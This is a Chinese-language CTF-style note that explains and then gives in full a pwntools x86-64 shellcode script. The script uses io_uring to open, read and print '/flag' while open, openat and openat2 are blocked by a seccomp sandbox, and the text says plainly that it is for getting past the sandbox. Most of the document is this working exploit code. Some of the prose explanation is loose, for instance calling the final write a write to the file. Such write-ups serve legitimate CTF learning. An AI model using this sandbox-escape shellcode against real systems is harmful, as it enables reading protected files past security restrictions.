# io_uring



这段 shellcode 是一段用汇编语言编写的低级代码，主要涉及 `io_uring` 系统调用的使用。`io_uring` 是 Linux 内核提供的一种高效的 I/O 提交机制，允许用户空间和内核空间进行异步 I/O 操作。下面我将逐步解释这段代码的含义。

### 主要内容概览

1. **内存分配和初始化**：
   - 通过 `mov`、`lea` 和 `sub rsp, 0x400` 等指令，分配了一些内存空间并初始化了相关寄存器。
   - `rep stosq` 被用来将寄存器 `rax` 的值填充到内存中，初始化某些内存区域。

2. **`io_uring` 相关操作**：
   - 使用 `syscall` 调用系统调用，这些调用与 `io_uring` 相关，处理异步 I/O 操作。
   - `io_uring_mmap` 被用于将 `io_uring` 结构映射到用户空间，并设置相关的内存区域。
   - 接下来是设置和配置提交队列、提交缓冲区等。
   
3. **`open` 操作**：
   - 通过构造一个路径字符串（`"/flag"`）来执行文件打开操作。
   - 使用 `io_uring_get_sqe` 和 `io_uring_prep_rw` 等函数来准备和提交 I/O 操作（读取文件）。

4. **读写操作**：
   - 使用 `io_uring` 进行文件的读写操作，文件操作是在 `io_uring` 提交队列中异步执行的。
   
5. **系统调用和 I/O 相关**：
   - 使用 `syscall` 指令发起具体的系统调用（例如打开文件、读取文件、写入文件等）。
   - 特别是与 `io_uring` 相关的操作，涉及创建提交队列、填充数据、提交 I/O 请求、处理响应等。

6. **程序持续运行**：
   - `while` 循环保持程序一直运行，等待 I/O 操作完成并执行其他操作。

### 关键部分逐步解析

#### 1. **内存分配和初始化**
```asm
mov rbp, rsp
sub rsp, 0x400
mov eax, 0
mov ecx, 0x80
mov rdi, rsp
rep stosq
```
这部分代码将栈指针 `rsp` 存储到 `rbp`，然后调整栈空间，分配 0x400 字节的内存，并通过 `rep stosq` 将内存区域初始化为零。

#### 2. **`io_uring_mmap` 操作**
```asm
lea rdi, [rbp - 0x380]
xor rax, rax
mov [rdi], rax
mov [rdi + 208], rax
mov eax, dword ptr [rbp - 0x3f8 + 4 * 16]
mov ebx, dword ptr [rbp - 0x3f8]
lea rax, [eax + ebx * 4]
```
这一部分在设置 `io_uring` 的映射内存结构。`io_uring_mmap` 将 `io_uring` 数据结构映射到用户空间，然后通过计算特定内存地址来初始化提交队列和其他必需的 I/O 数据结构。

#### 3. **`open` 操作**
```asm
mov rax, 0x67616c662f
mov [rbp - 0x60], rax
lea rdi, [rbp - 0x380]
call io_uring_get_sqe
```
这一部分代码在内存中构造文件路径字符串 `"/flag"`（通过 `0x67616c662f` 字节值的字符拼接）并调用 `io_uring_get_sqe` 获取提交队列元素（SQE）。随后，它调用 `io_uring_prep_rw` 来准备异步读写操作。

#### 4. **`read` 和 `write` 操作**
```asm
lea rdi, [rbp - 0x380]
call io_uring_get_sqe
mov rsi, rax
mov rdx, 4
lea rcx, [rbp - 0x60]
mov r8, 0x50
xor r9, r9
mov rdi, 22
call io_uring_prep_rw
```
这里准备了一个读操作，从文件读取 4 字节的数据。随后，执行了一个写操作，将数据写入文件。所有的操作都是异步的，通过 `io_uring` 提交队列来执行。

#### 5. **`while` 循环**
```asm
while:
jmp while
```
这部分代码使得程序进入一个死循环，持续运行。这通常意味着程序会等待异步 I/O 完成，或保持与内核的连接。

#### 6. **`io_uring` 辅助函数**
`io_uring_get_sqe` 和 `io_uring_prep_rw` 是两个辅助函数，负责准备和配置 `io_uring` 提交队列元素（SQE），以及执行相关的 I/O 操作。

### 总结

这段 shellcode 实现了以下功能：

1. **内存初始化**：分配并初始化内存空间。
2. **`io_uring` 初始化**：通过 `io_uring_mmap` 将内核中的 `io_uring` 数据结构映射到用户空间。
3. **文件操作**：通过构造文件路径字符串并调用 `io_uring` API 准备和执行异步文件 I/O 操作（如打开文件、读取文件、写入文件）。
4. **无限循环**：代码进入无限循环，保持程序的持续运行。

这段代码的关键目的是通过 `io_uring` 机制进行高效的文件 I/O 操作，并且它可能被用于执行某些渗透测试或漏洞利用任务。

1. open,openat都被禁，且openat2(0x1b5)不能使用，可以用下面这段shellcode来过掉沙箱：

   ```py
   		shellcode1=asm(f'''
   		mov rbp,rsp
   		sub rsp,0x400
   		mov eax,0
   		mov ecx,0x80
   		mov rdi,rsp
   		rep stosq
   		mov rdi,16
   		lea rsi,[rbp-0x3f8]
   		mov eax,425
   		syscall
   
   		mov [rbp-0x400],rax
   
   		/*  io_uring_mmap */
   		lea rdi,[rbp-0x380]
   		xor rax,rax
   		mov [rdi],rax
   		mov [rdi+208],rax
   
   		mov eax,dword ptr [rbp-0x3f8+4*16]
   		mov ebx,dword ptr [rbp-0x3f8]
   		lea rax,[eax+ebx*4]
   
   		mov ebx,dword ptr  [rbp-0x3f8+4*25]
   		mov esi,dword ptr  [rbp-0x3f8+4]
   		shl rsi,4
   		lea rcx,[rsi+rbx]
   
   		mov [rbp-0x380+8*9],rax
   		mov [rbp-0x380+104+8*7],rcx
   
   		mov ebx,dword ptr [rbp-0x3f8+5*4]
   		and ebx,1
   		test ebx,ebx
   		jz label1_1
   
   		cmp rax,rcx
   		jge label1_2
   		mov rax,rcx
   		label1_2:
   		mov [rbp-0x380+8*9],rax
   		mov [rbp-0x380+104+8*7],rax
   
   		label1_1:
   		mov rsi,rax
   		xor rdi,rdi
   		mov rdx,3
   		mov r10,32769
   		mov r8,[rbp-0x400]
   		xor r9,r9
   		mov rax,9
   		syscall
   
   		mov [rbp-0x380+8*10],rax
   
   		mov rcx,7
   		label1:
   		mov ebx,dword ptr [rbp-0x3f8+4*9+rcx*4]
   		lea rbx,[rbx+rax]
   		mov [rbp-0x380-8+rcx*8],rbx
   		dec rcx
   		test rcx,rcx
   		jnz label1
   
   
   		mov rsi,[rbp-0x380+104+8*7]
   		mov rdi,0
   		mov rdx,3
   		mov r10,32769
   		mov r8,[rbp-0x400]
   		mov r9d,0x8000000
   		mov rax,9
   		syscall
   
   		mov [rbp-0x380+104+8*8],rax
   
   		mov rcx,7
   		label2:
   		mov ebx,dword ptr  [rbp-0x3f8+4*19+rcx*4]
   		lea rbx,[rbx+rax]
   		mov [rbp-0x380+104+rcx*8],rbx
   		dec rcx
   		test rcx,rcx
   		jnz label2
   
   		mov ebx,dword ptr [rbp-0x3f8+4*26]
   		test ebx,ebx
   		jz label3
   		jmp label4
   		label3:
   		xor rbx,rbx
   		mov [rbp-0x380-8+104+4*8],rbx
   
   		label4:
   		mov esi,dword ptr [rbp-0x3f8]
   		shl rsi,6
   		xor rdi,rdi
   		mov rdx,3
   		mov r10,32769
   		mov r8,[rbp-0x400]
   		mov r9,0x10000000
   		mov rax,9
   		syscall
   		mov [rbp-0x380+7*8],rax
   
   		mov eax,dword ptr [rbp-0x400]
   		mov dword ptr [rbp-0x380+196],eax
   
   		mov eax,dword ptr [rbp-0x3f8+4*2]
   		mov dword ptr [rbp-0x380+192],eax
   
   		mov eax,dword ptr [rbp-0x3f8+4*5]
   		mov dword ptr [rbp-0x380+200],eax
   
   		/* io_uring_mmap end*/
   
   		/*
   		mov rdx,[rbp-0x400]
   		lea rdi,[rbp-0x380]
   		mov [rdi+196],rdx
   		*/
   
   
   		/* open */
   
   		mov rax,0x67616c662f
   		mov [rbp-0x60],rax
   		lea rdi,[rbp-0x380]
   		call io_uring_get_sqe
   
   		mov [rbp-0x70],rax
   		mov rsi,rax
   		mov rdx,-100
   		lea rcx,[rbp-0x60]
   		xor r8,r8
   		xor r9,r9
   		mov rdi,18
   		call io_uring_prep_rw
   
   
   		mov rdi,[rbp-0x70]
   
   		mov rax,4
   		mov [rdi+32],rax
   
   		xor rax,rax
   		mov dword ptr [rdi+28],eax
   
   
   		/* read */
   		lea rdi,[rbp-0x380]
   		call io_uring_get_sqe
   
   		mov rsi,rax
   
   		mov rdx,4
   		lea rcx,[rbp-0x60]
   		mov r8,0x50
   		xor r9,r9
   		mov rdi,22
   		call io_uring_prep_rw
   
   
   		/* write */
   		lea rdi,[rbp-0x380]
   		call io_uring_get_sqe
   
   		mov rsi,rax
   		mov rdx,1
   		lea rcx,[rbp-0x60]
   		mov r8,0x50
   		xor r9,r9
   		mov rdi,23
   		call io_uring_prep_rw
   
   		mov edi,dword ptr [rbp-0x380 + 196]
   		mov esi,dword ptr [rbp-0x380+64]
   		xor rdx,rdx
   		xor r10,r10
   		xor r8,r8
   		mov r9,8
   		mov rax,426
   		syscall
   
   		while:
   		jmp while
   
   		io_uring_prep_rw:
   		xor rbx,rbx
   		mov byte ptr [rsi],dil
   		mov byte ptr [rsi+1],bl
   		mov word ptr [rsi+2],bx
   		mov dword ptr [rsi+4],edx
   		mov [rsi+8],r9
   		mov [rsi+16],rcx
   		mov dword ptr [rsi+24],r8d
   		mov dword ptr [rsi+28],ebx
   		mov [rsi+32],rbx
   		mov word ptr [rsi+40],bx
   		mov word ptr [rsi+42],bx
   		mov dword ptr [rsi+44],ebx
   		mov qword ptr [rsi+56],rbx
   		mov rbx,[rsi+56]
   		mov [rsi+48],rbx
   		ret
   
   
   		io_uring_get_sqe:
   		mov     rax, [rdi]
   		xor     r8d, r8d
   		mov     ecx, [rax]
   		mov     eax, [rdi+0x44]
   		lea     edx, [rax+1]
   
   		mov     rcx, [rdi+0x10]
   		mov     r10,[rcx]
   		and     eax,dword ptr [rcx]
   		mov     rcx,[rdi+48]
   		mov     dword ptr [rcx+4*rax],eax
   
   		mov     [rdi+0x44], edx
   		mov     [rdi+64],edx
   		mov     rcx,[rdi+8]
   		mov     dword ptr [rcx],edx
   
   		shl     rax, 6
   		add     rax, [rdi+0x38]
   		ret
   		''')
   ```

   